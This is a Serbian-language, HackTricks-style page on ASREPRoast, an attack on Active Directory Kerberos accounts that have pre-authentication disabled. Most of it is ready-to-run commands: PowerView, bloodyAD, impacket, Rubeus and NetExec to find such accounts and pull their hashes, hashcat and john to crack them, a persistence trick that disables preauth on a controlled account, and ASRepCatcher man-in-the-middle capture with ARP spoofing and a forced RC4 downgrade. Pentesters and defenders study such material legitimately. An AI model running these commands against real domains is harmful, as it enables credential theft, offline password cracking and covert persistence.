# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je bezbednosni napad koji iskorišćava korisnike kojima nedostaje atribut **Kerberos pre-authentication required**. U suštini, ova ranjivost napadačima omogućava da zatraže autentikaciju korisnika od Domain Controller-a (DC) bez potrebe za lozinkom korisnika. DC zatim odgovara porukom šifrovanom ključem izvedenim iz lozinke korisnika, koju napadači mogu pokušati da crack-uju offline kako bi otkrili lozinku korisnika.

Glavni zahtevi za ovaj napad su:

- **Nedostatak Kerberos pre-authentication-a**: Ciljni korisnici ne smeju imati omogućenu ovu bezbednosnu funkciju.
- **Povezivanje sa Domain Controller-om (DC)**: Napadačima je potreban pristup DC-u kako bi slali zahteve i primali šifrovane poruke.
- **Opcion nalog domena**: Posedovanje naloga domena omogućava napadačima da efikasnije identifikuju ranjive korisnike putem LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumeracija ranjivih korisnika (potrebni akreditivi domena)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zahtev AS_REP poruke
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus podrazumevano zahteva **RC4**, pa Event ID **4768** obično prikazuje **preauth type 0** i **ticket encryption type 0x17**. Ako dodate **`/aes`** (ili je RC4 onemogućen za cilj), očekujte **AES etypes** umesto toga.<sup>[[2]](#references)</sup>

#### Brze one-liners (Linux)

- Najpre enumerišite potencijalne ciljeve (npr. iz leaked putanja za build) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Izvršite roast cele liste korisničkih imena bez validnih kredencijala pomoću NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ako imate kredencijale, prepustite NetExec-u da upita LDAP i zatraži svaki roastable nalog: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ako izlaz počinje sa **`$krb5asrep$23$`**, crackujte ga pomoću Hashcat-a **`-m 18200`**. Ako počinje sa **`$krb5asrep$17$`** ili **`$krb5asrep$18$`**, prednost dajte John-u sa opcijom **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Nemojte pretpostaviti da je svaki AS-REP roast RC4. Moderni alati mogu vratiti **RC4** (`$krb5asrep$23$`) ili **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), u zavisnosti od zahtevanog/ugovorenog enctype-a. **`hashcat -m 18200`** je namenjen za **etype 23**, dok **John** direktno podržava `krb5asrep` za **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Perzistencija

Nametnite da **preauth** nije potreban za korisnika nad kojim imate dozvole **GenericAll** (ili dozvole za upis svojstava):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez kredencijala

Napadač može da iskoristi poziciju man-in-the-middle za presretanje AS-REP paketa dok prolaze kroz mrežu, bez oslanjanja na to da je Kerberos pre-authentication onemogućen. Zato funkcioniše za sve korisnike na VLAN-u.\
Ako želite povezani trik bez kredencijala koji vraća **service ticket** umesto **TGT**-a od principal-a bez pre-authentication-a, pogledajte [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam to omogućava. Režim `relay` je ofanzivno najzanimljiviji jer može da primora korišćenje **RC4** kada klijent i dalje oglašava **etype 23**; `listen` ostaje pasivan i samo presreće ono što su klijent/DC dogovorili.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
